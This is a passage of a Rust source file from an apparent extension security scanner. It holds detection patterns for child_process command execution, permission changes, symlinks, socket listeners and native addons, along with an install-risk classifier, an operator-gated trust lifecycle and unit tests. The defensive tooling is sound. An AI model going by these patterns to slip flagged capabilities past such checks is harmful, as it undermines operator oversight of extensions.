            .trim_end_matches(')')
            .trim();
        if let Ok(ms) = rest.parse::<u64>() {
            return ms < 10;
        }
    }
    false
}

/// Detect `with (...)` statement — not `width` or `without`.
fn contains_with_statement(text: &str) -> bool {
    let trimmed = text.trim();
    // `with` as a statement: `with (` at statement position.
    if trimmed.starts_with("with (") || trimmed.starts_with("with(") {
        return true;
    }
    // Also catch `} with (` for inline blocks.
    if let Some(pos) = text.find("with")
        && pos > 0
    {
        let before = text[..pos].trim_end();
        let after = text[pos + 4..].trim_start();
        if (before.ends_with('{') || before.ends_with('}') || before.ends_with(';'))
            && after.starts_with('(')
        {
            return true;
        }
    }
    false
}

/// Detect `debugger;` as a standalone statement.
fn is_debugger_statement(text: &str) -> bool {
    let trimmed = text.trim();
    trimmed == "debugger;" || trimmed == "debugger" || trimmed.starts_with("debugger;")
}

/// Detect console.error/warn/log with interpolated values (not just strings).
fn contains_console_info_leak(text: &str) -> bool {
    // Only flag console.error/warn which more likely leak sensitive data.
    if !text.contains("console.error") && !text.contains("console.warn") {
        return false;
    }
    // Flag if there's variable interpolation or multiple args.
    text.contains("console.error(") || text.contains("console.warn(")
}

// ---- Pattern detection helpers added in rulebook v2.0.0 ----

/// Detect `child_process` command execution: exec, execSync, spawn, spawnSync,
/// execFile, execFileSync, fork.
fn contains_child_process_spawn(text: &str) -> bool {
    let spawn_patterns = [
        "exec(",
        "execSync(",
        "spawn(",
        "spawnSync(",
        "execFile(",
        "execFileSync(",
        "fork(",
    ];
    // Only flag when preceded by child_process context indicators.
    let has_cp_context =
        text.contains("child_process") || text.contains("cp.") || text.contains("childProcess");

    if has_cp_context {
        return spawn_patterns.iter().any(|p| text.contains(p));
    }

    // Also flag direct destructured usage: `const { exec } = require('child_process')`
    // is already covered by the context check. Check for standalone exec() that looks
    // like it comes from child_process (not general method calls).
    false
}

/// Find column position for child_process spawn patterns.
fn find_child_process_column(text: &str) -> Option<usize> {
    for pattern in &[
        "execSync(",
        "execFileSync(",
        "spawnSync(",
        "execFile(",
        "spawn(",
        "exec(",
        "fork(",
    ] {
        if let Some(pos) = text.find(pattern) {
            return Some(pos + 1);
        }
    }
    None
}

/// Detect `globalThis`/`global` property mutation (assignment, not just read).
fn contains_global_mutation(text: &str) -> bool {
    // Mutation patterns: assignment to globalThis.X or global.X
    let assignment_patterns = ["globalThis.", "global.", "globalThis["];

    for pat in &assignment_patterns {
        for (pos, _) in text.match_indices(pat) {
            let after = &text[pos + pat.len()..];
            // Check if this is an assignment (has = but not == or ===)
            if let Some(eq_pos) = after.find('=') {
                let before_eq = &after[..eq_pos];
                let after_eq = &after[eq_pos..];
                // Not a comparison (==, ===) and not part of a longer identifier
                if !after_eq.starts_with("==")
                    && !before_eq.contains('(')
                    && !before_eq.contains(')')
                {
                    return true;
                }
            }
        }
    }
    false
}

/// Detect `fs.symlink`/`fs.symlinkSync`/`fs.link`/`fs.linkSync`.
fn contains_symlink_creation(text: &str) -> bool {
    text.contains("fs.symlink(")
        || text.contains("fs.symlinkSync(")
        || text.contains("fs.link(")
        || text.contains("fs.linkSync(")
        || text.contains("symlinkSync(")
        || text.contains("linkSync(")
}

/// Detect `fs.chmod`/`fs.chown` and their sync variants.
fn contains_permission_change(text: &str) -> bool {
    text.contains("fs.chmod(")
        || text.contains("fs.chmodSync(")
        || text.contains("fs.chown(")
        || text.contains("fs.chownSync(")
        || text.contains("fs.lchmod(")
        || text.contains("fs.lchown(")
        || text.contains("chmodSync(")
        || text.contains("chownSync(")
}

/// Detect server/socket listener creation.
fn contains_socket_listener(text: &str) -> bool {
    text.contains("createServer(")
        || text.contains("createSocket(")
        || text.contains(".listen(")
            && (text.contains("server") || text.contains("http") || text.contains("net"))
}

/// Detect `require()` of native addon files (.node, .so, .dylib).
fn contains_native_module_require(text: &str) -> bool {
    if !text.contains("require(") {
        return false;
    }
    let native_exts = [".node\"", ".node'", ".so\"", ".so'", ".dylib\"", ".dylib'"];
    native_exts.iter().any(|ext| text.contains(ext))
}

/// Truncate a source snippet to a reasonable display length.
fn truncate_snippet(text: &str) -> String {
    const MAX_SNIPPET_LEN: usize = 200;
    if text.len() <= MAX_SNIPPET_LEN {
        text.to_string()
    } else {
        let mut end = 0;
        for (i, c) in text.char_indices() {
            if i >= MAX_SNIPPET_LEN {
                break;
            }
            end = i + c.len_utf8();
        }
        if end < text.len() {
            format!("{}...", &text[..end])
        } else {
            text.to_string()
        }
    }
}

/// Collect JS/TS files from a path (file or directory).
fn collect_scannable_files(path: &Path) -> std::io::Result<Vec<std::path::PathBuf>> {
    if path.is_file() {
        return Ok(vec![path.to_path_buf()]);
    }
    let mut files = Vec::new();
    for entry in std::fs::read_dir(path)? {
        let entry = entry?;
        let p = entry.path();
        let file_type = entry.file_type()?;
        if file_type.is_dir() {
            // Skip node_modules and hidden dirs.
            let name = p.file_name().and_then(|n| n.to_str()).unwrap_or("");
            if name == "node_modules" || name.starts_with('.') {
                continue;
            }
            files.extend(collect_scannable_files(&p)?);
        } else if file_type.is_file()
            && let Some(ext) = p.extension().and_then(|e| e.to_str())
            && matches!(
                ext,
                "js" | "ts" | "mjs" | "mts" | "cjs" | "cts" | "jsx" | "tsx"
            )
        {
            files.push(p);
        }
    }
    files.sort();
    Ok(files)
}

/// Compute relative POSIX path from root to path.
fn relative_posix_path(root: &Path, path: &Path) -> String {
    let relative = path.strip_prefix(root).unwrap_or(path);
    if relative.as_os_str().is_empty() {
        return path.file_name().and_then(|name| name.to_str()).map_or_else(
            || path.to_string_lossy().replace('\\', "/"),
            ToString::to_string,
        );
    }
    relative.to_string_lossy().replace('\\', "/")
}

/// Strip block comments for security scanning. Simpler than the full
/// compat scanner's `strip_js_comments` — we only need to track the
/// block comment state to avoid false positives.
fn strip_block_comment_tracking(line: &str, in_block: &mut bool) -> String {
    let mut result = String::with_capacity(line.len());
    let mut chars = line.chars().peekable();

    while let Some(c) = chars.next() {
        if *in_block {
            if c == '*' && chars.peek() == Some(&'/') {
                chars.next(); // Consume '/'
                *in_block = false;
            }
        } else if c == '/' && chars.peek() == Some(&'*') {
            chars.next(); // Consume '*'
            *in_block = true;
        } else if c == '/' && chars.peek() == Some(&'/') {
            // Rest of line is comment.
            break;
        } else {
            result.push(c);
        }
    }

    result
}

// ============================================================================
// Install-time composite risk classifier (bd-21vng, SEC-2.3)
// ============================================================================

/// Schema version for the install-time risk classification report.
pub const INSTALL_TIME_RISK_SCHEMA: &str = "pi.ext.install_risk.v1";

/// Install-time recommendation.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum InstallRecommendation {
    /// Safe to install and load without further review.
    Allow,
    /// Install but flag for operator review before first run.
    Review,
    /// Block installation; active exploit vectors detected.
    Block,
}

impl fmt::Display for InstallRecommendation {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            Self::Allow => f.write_str("ALLOW"),
            Self::Review => f.write_str("REVIEW"),
            Self::Block => f.write_str("BLOCK"),
        }
    }
}

/// Composite install-time risk classification report that synthesizes signals
/// from both the compatibility preflight and the security scanner into a
/// single deterministic verdict.
///
/// The classification algorithm is purely functional: given the same
/// `PreflightReport` and `SecurityScanReport`, it always produces the
/// identical `InstallTimeRiskReport`. No randomness, no side effects.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct InstallTimeRiskReport {
    /// Schema version.
    pub schema: String,
    /// Extension identifier.
    pub extension_id: String,
    /// Composite risk tier (worst-of across both reports).
    pub composite_risk_tier: RiskTier,
    /// Composite risk score (0 = maximum risk, 100 = clean).
    pub composite_risk_score: u8,
    /// Install recommendation derived from composite analysis.
    pub recommendation: InstallRecommendation,
    /// Human-readable one-line verdict.
    pub verdict: String,
    /// Compatibility preflight summary.
    pub preflight_summary: PreflightSummaryBrief,
    /// Security scan summary.
    pub security_summary: SecuritySummaryBrief,
    /// Rulebook version that produced the security findings.
    pub rulebook_version: String,
}

/// Abbreviated preflight summary for embedding in the composite report.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct PreflightSummaryBrief {
    pub verdict: PreflightVerdict,
    pub confidence: u8,
    pub errors: usize,
    pub warnings: usize,
}

/// Abbreviated security summary for embedding in the composite report.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SecuritySummaryBrief {
    pub overall_tier: RiskTier,
    pub critical: usize,
    pub high: usize,
    pub medium: usize,
    pub low: usize,
    pub total_findings: usize,
}

impl InstallTimeRiskReport {
    /// Build from a preflight report and a security scan report.
    ///
    /// The composite risk tier is the worst (lowest ordinal) tier from either
    /// report. The composite score is a weighted combination of the preflight
    /// confidence and the security finding severity.
    ///
    /// This function is pure and deterministic.
    #[must_use]
    pub fn classify(
        extension_id: &str,
        preflight: &PreflightReport,
        security: &SecurityScanReport,
    ) -> Self {
        let preflight_summary = PreflightSummaryBrief {
            verdict: preflight.verdict,
            confidence: preflight.confidence.value(),
            errors: preflight.summary.errors,
            warnings: preflight.summary.warnings,
        };

        let security_summary = SecuritySummaryBrief {
            overall_tier: security.overall_tier,
            critical: security.tier_counts.critical,
            high: security.tier_counts.high,
            medium: security.tier_counts.medium,
            low: security.tier_counts.low,
            total_findings: security.findings.len(),
        };

        // Composite risk tier: worst-of across both reports.
        // Map preflight verdict to a risk tier for comparison.
        let preflight_risk = match preflight.verdict {
            PreflightVerdict::Fail => RiskTier::High,
            PreflightVerdict::Warn => RiskTier::Medium,
            PreflightVerdict::Pass => RiskTier::Low,
        };
        let composite_risk_tier = preflight_risk.min(security.overall_tier);

        // Composite risk score: 0 = maximum risk, 100 = clean.
        // Start from 100 and apply deductions.
        let security_deduction = security
            .tier_counts
            .critical
            .saturating_mul(30)
            .saturating_add(security.tier_counts.high.saturating_mul(20))
            .saturating_add(security.tier_counts.medium.saturating_mul(10))
            .saturating_add(security.tier_counts.low.saturating_mul(3));
        let preflight_deduction = preflight
            .summary
            .errors
            .saturating_mul(15)
            .saturating_add(preflight.summary.warnings.saturating_mul(5));
        let total_deduction = security_deduction.saturating_add(preflight_deduction);
        let composite_risk_score =
            u8::try_from(100_usize.saturating_sub(total_deduction).min(100)).unwrap_or(0);

        // Recommendation: deterministic decision tree.
        let recommendation = match composite_risk_tier {
            RiskTier::Critical => InstallRecommendation::Block,
            RiskTier::High => InstallRecommendation::Review,
            RiskTier::Medium => {
                if composite_risk_score < 50 {
                    InstallRecommendation::Review
                } else {
                    InstallRecommendation::Allow
                }
            }
            RiskTier::Low => InstallRecommendation::Allow,
        };

        let verdict = Self::format_verdict(
            recommendation,
            &preflight_summary,
            &security_summary,
            composite_risk_score,
        );

        Self {
            schema: INSTALL_TIME_RISK_SCHEMA.to_string(),
            extension_id: extension_id.to_string(),
            composite_risk_tier,
            composite_risk_score,
            recommendation,
            verdict,
            preflight_summary,
            security_summary,
            rulebook_version: SECURITY_RULEBOOK_VERSION.to_string(),
        }
    }

    fn format_verdict(
        recommendation: InstallRecommendation,
        preflight: &PreflightSummaryBrief,
        security: &SecuritySummaryBrief,
        score: u8,
    ) -> String {
        let sec_part = if security.total_findings == 0 {
            "no security findings".to_string()
        } else {
            let mut parts = Vec::new();
            if security.critical > 0 {
                parts.push(format!("{} critical", security.critical));
            }
            if security.high > 0 {
                parts.push(format!("{} high", security.high));
            }
            if security.medium > 0 {
                parts.push(format!("{} medium", security.medium));
            }
            if security.low > 0 {
                parts.push(format!("{} low", security.low));
            }
            parts.join(", ")
        };

        let compat_part = match preflight.verdict {
            PreflightVerdict::Pass => "compatible".to_string(),
            PreflightVerdict::Warn => format!("{} compat warning(s)", preflight.warnings),
            PreflightVerdict::Fail => format!("{} compat error(s)", preflight.errors),
        };

        format!("{recommendation}: score {score}/100 — {sec_part}; {compat_part}")
    }

    /// Serialize to pretty JSON.
    ///
    /// # Errors
    ///
    /// Returns an error if serialization fails.
    pub fn to_json(&self) -> Result<String, serde_json::Error> {
        serde_json::to_string_pretty(self)
    }

    /// Whether installation should be blocked.
    #[must_use]
    pub const fn should_block(&self) -> bool {
        matches!(self.recommendation, InstallRecommendation::Block)
    }

    /// Whether manual review is recommended before first run.
    #[must_use]
    pub const fn needs_review(&self) -> bool {
        matches!(
            self.recommendation,
            InstallRecommendation::Block | InstallRecommendation::Review
        )
    }
}

/// Convenience function: run both the preflight analyzer and security scanner
/// on raw source text and produce a composite install-time risk report.
///
/// This is the primary entry point for install-time risk classification.
#[must_use]
pub fn classify_extension_source(
    extension_id: &str,
    source: &str,
    policy: &ExtensionPolicy,
) -> InstallTimeRiskReport {
    let analyzer = PreflightAnalyzer::new(policy, Some(extension_id));
    let preflight = analyzer.analyze_source(extension_id, source);
    let security = SecurityScanner::scan_source(extension_id, source);
    InstallTimeRiskReport::classify(extension_id, &preflight, &security)
}

/// Run both the preflight analyzer and security scanner on extension files
/// at a given path and produce a composite install-time risk report.
pub fn classify_extension_path(
    extension_id: &str,
    path: &Path,
    policy: &ExtensionPolicy,
) -> InstallTimeRiskReport {
    let analyzer = PreflightAnalyzer::new(policy, Some(extension_id));
    let preflight = analyzer.analyze(path);
    let security = SecurityScanner::scan_path(extension_id, path, path);
    InstallTimeRiskReport::classify(extension_id, &preflight, &security)
}

// ============================================================================
// Quarantine-to-trust promotion lifecycle (bd-21nj4, SEC-2.4)
// ============================================================================

/// Schema version for trust lifecycle transition events.
pub const TRUST_LIFECYCLE_SCHEMA: &str = "pi.ext.trust_lifecycle.v1";

/// Extension trust lifecycle states.
///
/// The trust lifecycle is a strict state machine:
/// - `Quarantined` → `Restricted` (via promotion with operator acknowledgment)
/// - `Restricted` → `Trusted` (via promotion with operator acknowledgment)
/// - `Trusted` → `Quarantined` (via demotion, immediate)
/// - `Restricted` → `Quarantined` (via demotion, immediate)
///
/// Transitions always require an explicit reason and produce an audit event.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, PartialOrd, Ord, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum ExtensionTrustState {
    /// Extension is fully quarantined: no dangerous hostcalls permitted.
    /// Default state for extensions with `Block` or `Review` install
    /// recommendations.
    Quarantined,
    /// Extension may execute read-only hostcalls but not write, exec, or
    /// network operations. Intermediate state requiring a second promotion
    /// to reach full trust.
    Restricted,
    /// Extension is fully trusted and may exercise all policy-allowed
    /// capabilities.
    Trusted,
}

impl fmt::Display for ExtensionTrustState {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            Self::Quarantined => f.write_str("quarantined"),
            Self::Restricted => f.write_str("restricted"),
            Self::Trusted => f.write_str("trusted"),
        }
    }
}

impl ExtensionTrustState {
    /// Whether the extension may execute dangerous hostcalls (write, exec,
    /// network, env).
    #[must_use]
    pub const fn allows_dangerous_hostcalls(self) -> bool {
        matches!(self, Self::Trusted)
    }

    /// Whether the extension may execute read-only hostcalls (read, list,
    /// stat, tool registration).
    #[must_use]
    pub const fn allows_read_hostcalls(self) -> bool {
        matches!(self, Self::Restricted | Self::Trusted)
    }

    /// Whether the extension is in quarantine and cannot execute any
    /// hostcalls beyond registration.
    #[must_use]
    pub const fn is_quarantined(self) -> bool {
        matches!(self, Self::Quarantined)
    }
}

/// Direction of a trust state transition.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum TrustTransitionKind {
    /// Promote to a higher trust level.
    Promote,
    /// Demote to a lower trust level (quarantine).
    Demote,
}

impl fmt::Display for TrustTransitionKind {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            Self::Promote => f.write_str("promote"),
            Self::Demote => f.write_str("demote"),
        }
    }
}

/// A recorded trust state transition event for the audit trail.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct TrustTransitionEvent {
    /// Schema version.
    pub schema: String,
    /// Extension identifier.
    pub extension_id: String,
    /// Previous trust state.
    pub from_state: ExtensionTrustState,
    /// New trust state.
    pub to_state: ExtensionTrustState,
    /// Direction of transition.
    pub kind: TrustTransitionKind,
    /// Human-readable reason for the transition.
    pub reason: String,
    /// Whether operator explicitly acknowledged this transition.
    pub operator_acknowledged: bool,
    /// Install-time risk score at time of transition (0-100).
    pub risk_score: Option<u8>,
    /// Install-time recommendation at time of transition.
    pub recommendation: Option<InstallRecommendation>,
    /// Timestamp (RFC 3339) of the transition.
    pub timestamp: String,
}

impl TrustTransitionEvent {
    /// Serialize to JSON.
    ///
    /// # Errors
    ///
    /// Returns an error if serialization fails.
    pub fn to_json(&self) -> Result<String, serde_json::Error> {
        serde_json::to_string(self)
    }
}

/// Errors that can occur during trust state transitions.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum TrustTransitionError {
    /// Attempted promotion without operator acknowledgment.
    OperatorAckRequired {
        from: ExtensionTrustState,
        to: ExtensionTrustState,
    },
    /// Attempted an invalid state transition (e.g., Quarantined → Trusted
    /// without passing through Restricted).
    InvalidTransition {
        from: ExtensionTrustState,
        to: ExtensionTrustState,
    },
    /// Extension's install-time risk score is too high for the target state.
    RiskTooHigh {
        target: ExtensionTrustState,
        risk_score: u8,
        max_allowed: u8,
    },
}

impl fmt::Display for TrustTransitionError {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            Self::OperatorAckRequired { from, to } => {
                write!(
                    f,
                    "operator acknowledgment required to promote {from} → {to}"
                )
            }
            Self::InvalidTransition { from, to } => {
                write!(f, "invalid trust transition: {from} → {to}")
            }
            Self::RiskTooHigh {
                target,
                risk_score,
                max_allowed,
            } => {
                write!(
                    f,
                    "risk score {risk_score} exceeds maximum {max_allowed} for {target} state"
                )
            }
        }
    }
}

/// Mutable trust lifecycle tracker for a single extension.
///
/// This struct manages the trust state machine and produces audit events
/// for every transition.
#[derive(Debug, Clone)]
pub struct ExtensionTrustTracker {
    extension_id: String,
    state: ExtensionTrustState,
    history: Vec<TrustTransitionEvent>,
}

impl ExtensionTrustTracker {
    /// Create a new tracker with the given initial state.
    #[must_use]
    pub fn new(extension_id: &str, initial_state: ExtensionTrustState) -> Self {
        Self {
            extension_id: extension_id.to_string(),
            state: initial_state,
            history: Vec::new(),
        }
    }

    /// Create a tracker with initial state derived from an install-time risk
    /// report.
    #[must_use]
    pub fn from_risk_report(report: &InstallTimeRiskReport) -> Self {
        let state = match report.recommendation {
            InstallRecommendation::Block | InstallRecommendation::Review => {
                ExtensionTrustState::Quarantined
            }
            InstallRecommendation::Allow => ExtensionTrustState::Trusted,
        };
        Self::new(&report.extension_id, state)
    }

    /// Current trust state.
    #[must_use]
    pub const fn state(&self) -> ExtensionTrustState {
        self.state
    }

    /// Extension identifier.
    #[must_use]
    pub fn extension_id(&self) -> &str {
        &self.extension_id
    }

    /// Full transition history.
    #[must_use]
    pub fn history(&self) -> &[TrustTransitionEvent] {
        &self.history
    }

    /// Attempt to promote the extension to the next trust level.
    ///
    /// Promotions must follow the strict path:
    /// `Quarantined` → `Restricted` → `Trusted`.
    ///
    /// Skipping levels (e.g., `Quarantined` → `Trusted`) is not allowed.
    ///
    /// # Errors
    ///
    /// Returns `TrustTransitionError` if:
    /// - `operator_ack` is false (promotions require explicit acknowledgment)
    /// - The extension is already `Trusted`
    /// - The risk score exceeds the threshold for the target state
    pub fn promote(
        &mut self,
        reason: &str,
        operator_ack: bool,
        risk_score: Option<u8>,
        recommendation: Option<InstallRecommendation>,
    ) -> Result<&TrustTransitionEvent, TrustTransitionError> {
        let target = match self.state {
            ExtensionTrustState::Quarantined => ExtensionTrustState::Restricted,
            ExtensionTrustState::Restricted => ExtensionTrustState::Trusted,
            ExtensionTrustState::Trusted => {
                return Err(TrustTransitionError::InvalidTransition {
                    from: self.state,
                    to: ExtensionTrustState::Trusted,
                });
            }
        };

        if !operator_ack {
            return Err(TrustTransitionError::OperatorAckRequired {
                from: self.state,
                to: target,
            });
        }

        // Risk threshold gate: Restricted requires score >= 30, Trusted
        // requires >= 50.
        if let Some(score) = risk_score {
            let max = match target {
                ExtensionTrustState::Restricted => 30,
                ExtensionTrustState::Trusted => 50,
                ExtensionTrustState::Quarantined => 0,
            };
            if score < max {
                return Err(TrustTransitionError::RiskTooHigh {
                    target,
                    risk_score: score,
                    max_allowed: max,
                });
            }
        }

        let event = TrustTransitionEvent {
            schema: TRUST_LIFECYCLE_SCHEMA.to_string(),
            extension_id: self.extension_id.clone(),
            from_state: self.state,
            to_state: target,
            kind: TrustTransitionKind::Promote,
            reason: reason.to_string(),
            operator_acknowledged: true,
            risk_score,
            recommendation,
            timestamp: now_rfc3339(),
        };

        self.state = target;
        self.history.push(event);
        Ok(self.history.last().unwrap())
    }

    /// Demote the extension back to quarantine.
    ///
    /// Demotions are always allowed and do not require operator
    /// acknowledgment. They are immediate and unconditional.
    ///
    /// # Errors
    ///
    /// Returns `TrustTransitionError::InvalidTransition` if the extension is
    /// already quarantined.
    pub fn demote(&mut self, reason: &str) -> Result<&TrustTransitionEvent, TrustTransitionError> {
        if self.state == ExtensionTrustState::Quarantined {
            return Err(TrustTransitionError::InvalidTransition {
                from: self.state,
                to: ExtensionTrustState::Quarantined,
            });
        }

        let event = TrustTransitionEvent {
            schema: TRUST_LIFECYCLE_SCHEMA.to_string(),
            extension_id: self.extension_id.clone(),
            from_state: self.state,
            to_state: ExtensionTrustState::Quarantined,
            kind: TrustTransitionKind::Demote,
            reason: reason.to_string(),
            operator_acknowledged: false,
            risk_score: None,
            recommendation: None,
            timestamp: now_rfc3339(),
        };

        self.state = ExtensionTrustState::Quarantined;
        self.history.push(event);
        Ok(self.history.last().unwrap())
    }

    /// Export the full transition history as JSONL.
    ///
    /// # Errors
    ///
    /// Returns an error if serialization fails.
    pub fn history_jsonl(&self) -> Result<String, serde_json::Error> {
        let mut out = String::new();
        for (i, event) in self.history.iter().enumerate() {
            if i > 0 {
                out.push('\n');
            }
            out.push_str(&serde_json::to_string(event)?);
        }
        Ok(out)
    }
}

/// Determine the initial trust state for a newly installed extension
/// based on its install-time risk report.
#[must_use]
pub const fn initial_trust_state(report: &InstallTimeRiskReport) -> ExtensionTrustState {
    match report.recommendation {
        InstallRecommendation::Block | InstallRecommendation::Review => {
            ExtensionTrustState::Quarantined
        }
        InstallRecommendation::Allow => ExtensionTrustState::Trusted,
    }
}

/// Check whether a hostcall category is allowed for the given trust state.
///
/// Dangerous categories (write, exec, env, http) require `Trusted` state.
/// Read-only categories (read, list, stat, tool) require at least `Restricted`.
/// Registration-only operations (register tool/slash_command) are always
/// allowed.
#[must_use]
#[allow(clippy::match_same_arms)] // Explicit dangerous-category arm kept for documentation
pub fn is_hostcall_allowed_for_trust(
    trust_state: ExtensionTrustState,
    hostcall_category: &str,
) -> bool {
    match hostcall_category {
        // Always allowed (registration).
        "register" | "tool" | "slash_command" | "shortcut" | "flag" | "event_hook" | "log" => true,
        // Read-only: requires at least Restricted.
        "read" | "list" | "stat" | "session_read" | "ui" => trust_state.allows_read_hostcalls(),
        // Dangerous: requires Trusted.
        "write" | "exec" | "env" | "http" | "session_write" | "fs_write" | "fs_delete"
        | "fs_mkdir" => trust_state.allows_dangerous_hostcalls(),
        // Unknown categories default to requiring Trusted.
        _ => trust_state.allows_dangerous_hostcalls(),
    }
}

fn now_rfc3339() -> String {
    chrono::Utc::now().to_rfc3339_opts(chrono::SecondsFormat::Millis, true)
}

// ============================================================================
// Tests
// ============================================================================

#[cfg(test)]
mod tests {
    use super::*;
    use crate::extensions::ExtensionPolicy;

    #[cfg(unix)]
    struct ModeRestoreGuard {
        path: std::path::PathBuf,
        original: Option<std::fs::Permissions>,
    }

    #[cfg(unix)]
    impl ModeRestoreGuard {
        fn apply(path: &Path, mode: u32) -> Self {
            use std::os::unix::fs::PermissionsExt as _;

            let original = std::fs::metadata(path)
                .expect("stat permission fixture")
                .permissions();
            std::fs::set_permissions(path, std::fs::Permissions::from_mode(mode))
                .expect("apply permission fixture mode");
            Self {
                path: path.to_path_buf(),
                original: Some(original),
            }
        }

        fn deny_all(path: &Path) -> Self {
            Self::apply(path, 0o000)
        }

        fn restore(mut self) {
            use std::os::unix::fs::PermissionsExt as _;

            let original = self
                .original
                .as_ref()
                .expect("permission guard must be armed")
                .clone();
            let expected_mode = original.mode();
            std::fs::set_permissions(&self.path, original).expect("restore permission fixture");
            let restored_mode = std::fs::metadata(&self.path)
                .expect("stat restored permission fixture")
                .permissions()
                .mode();
            assert_eq!(
                restored_mode & 0o7777,
                expected_mode & 0o7777,
                "permission fixture mode must be restored exactly"
            );
            self.original = None;
        }
    }

    #[cfg(unix)]
    impl Drop for ModeRestoreGuard {
        fn drop(&mut self) {
            if let Some(original) = self.original.take() {
                let _ = std::fs::set_permissions(&self.path, original);
            }
        }
    }

    // ---- ModuleSupport ----

    #[test]
    fn module_support_severity_mapping() {
        assert_eq!(ModuleSupport::Real.severity(), FindingSeverity::Info);
        assert_eq!(ModuleSupport::Partial.severity(), FindingSeverity::Warning);
        assert_eq!(ModuleSupport::Stub.severity(), FindingSeverity::Warning);
        assert_eq!(ModuleSupport::ErrorThrow.severity(), FindingSeverity::Error);
        assert_eq!(ModuleSupport::Missing.severity(), FindingSeverity::Error);
    }

    #[test]
    fn module_support_display() {
        assert_eq!(format!("{}", ModuleSupport::Real), "fully supported");
        assert_eq!(format!("{}", ModuleSupport::Missing), "not available");
    }

    #[test]
    fn module_support_serde_roundtrip() {
        for variant in [
            ModuleSupport::Real,
            ModuleSupport::Partial,
            ModuleSupport::Stub,
            ModuleSupport::ErrorThrow,
            ModuleSupport::Missing,
        ] {
            let json = serde_json::to_string(&variant).unwrap();
            let back: ModuleSupport = serde_json::from_str(&json).unwrap();
            assert_eq!(variant, back);
        }
    }

    // ---- FindingSeverity ordering ----

    #[test]
    fn severity_ordering() {
        assert!(FindingSeverity::Info < FindingSeverity::Warning);
        assert!(FindingSeverity::Warning < FindingSeverity::Error);
    }

    // ---- known_module_support ----

    #[test]
    fn known_modules_p0_are_real() {
        assert_eq!(known_module_support("path"), Some(ModuleSupport::Real));
        assert_eq!(known_module_support("node:path"), Some(ModuleSupport::Real));
        assert_eq!(known_module_support("os"), Some(ModuleSupport::Real));
        assert_eq!(known_module_support("node:os"), Some(ModuleSupport::Real));
        assert_eq!(known_module_support("fs"), Some(ModuleSupport::Real));
        assert_eq!(known_module_support("node:fs"), Some(ModuleSupport::Real));
        assert_eq!(
            known_module_support("child_process"),
            Some(ModuleSupport::Real)
        );
    }

    #[test]
    fn known_modules_fs_promises_partial() {
        assert_eq!(
            known_module_support("node:fs/promises"),
            Some(ModuleSupport::Partial)
        );
        assert_eq!(
            known_module_support("fs/promises"),
            Some(ModuleSupport::Partial)
        );
    }

    #[test]
    fn known_modules_readline_partial() {
        assert_eq!(
            known_module_support("node:readline"),
            Some(ModuleSupport::Partial)
        );
        assert_eq!(
            known_module_support("readline/promises"),
            Some(ModuleSupport::Partial)
        );
    }

    #[test]
    fn known_modules_test_partial() {
        assert_eq!(
            known_module_support("node:test"),
            Some(ModuleSupport::Partial)
        );
        assert_eq!(known_module_support("test"), Some(ModuleSupport::Partial));
    }

    #[test]
    fn known_modules_glob_partial() {
        assert_eq!(known_module_support("glob"), Some(ModuleSupport::Partial));
    }

    #[test]
    fn known_modules_npm_virtual_stubs() {
        for specifier in [
            "ws",
            "axios",
            "open",
            "commander",
            "chalk",
            "better-sqlite3",
        ] {
            assert_eq!(
                known_module_support(specifier),
                Some(ModuleSupport::Stub),
                "{specifier} should match the registered npm virtual module support level"
            );
        }
    }

    #[test]
    fn known_modules_zlib_partial() {
        assert_eq!(known_module_support("zlib"), Some(ModuleSupport::Partial));
        assert_eq!(
            known_module_support("node:zlib"),
            Some(ModuleSupport::Partial)
        );
    }

    #[test]
    fn known_modules_error_throw() {
        assert_eq!(
            known_module_support("node:tls"),
            Some(ModuleSupport::ErrorThrow)
        );
        assert_eq!(known_module_support("dns"), Some(ModuleSupport::ErrorThrow));
    }

    #[test]
    fn known_modules_net_stub() {
        assert_eq!(known_module_support("node:net"), Some(ModuleSupport::Stub));
    }

    #[test]
    fn known_modules_stubs() {
        assert_eq!(known_module_support("node:vm"), Some(ModuleSupport::Stub));
        assert_eq!(
            known_module_support("node:http2"),
            Some(ModuleSupport::Stub)
        );
        assert_eq!(known_module_support("chokidar"), Some(ModuleSupport::Stub));
    }

    #[test]
    fn unknown_module_returns_none() {
        assert_eq!(known_module_support("my-custom-lib"), None);
        assert_eq!(known_module_support("./relative"), None);
    }

    // ---- module_remediation ----

    #[test]
    fn remediation_for_real_is_none() {
        assert!(module_remediation("path", ModuleSupport::Real).is_none());
    }

    #[test]
    fn remediation_for_net_stub() {
        let r = module_remediation("node:net", ModuleSupport::Stub);
        assert!(r.is_some());
        let msg = r.unwrap();
        assert!(msg.contains("stubbed"));
        assert!(msg.contains("pi.http") || msg.contains("fetch()"));
    }

    #[test]
    fn remediation_for_fs_promises_partial() {
        let r = module_remediation("fs/promises", ModuleSupport::Partial);
        assert!(r.is_some());
        assert!(r.unwrap().contains("synchronous"));
    }

    #[test]
    fn remediation_for_readline_partial_mentions_ui() {
        let r = module_remediation("node:readline", ModuleSupport::Partial);
        assert!(r.is_some());
        assert!(r.unwrap().contains("pi.ui"));
    }

    #[test]
    fn remediation_for_node_test_partial() {
        let r = module_remediation("node:test", ModuleSupport::Partial);
        assert!(r.is_some());
        assert!(r.unwrap().contains("node:test"));
    }

    #[test]
    fn remediation_for_http2_stub() {
        let r = module_remediation("node:http2", ModuleSupport::Stub);
        assert!(r.is_some());
        assert!(r.unwrap().contains("http2"));
    }

    // ---- extract helpers ----

    #[test]
    fn extract_specifier_from_message_works() {
        let msg = "import of unsupported builtin `node:vm`";
        assert_eq!(
            extract_specifier_from_message(msg),
            Some("node:vm".to_string())
        );
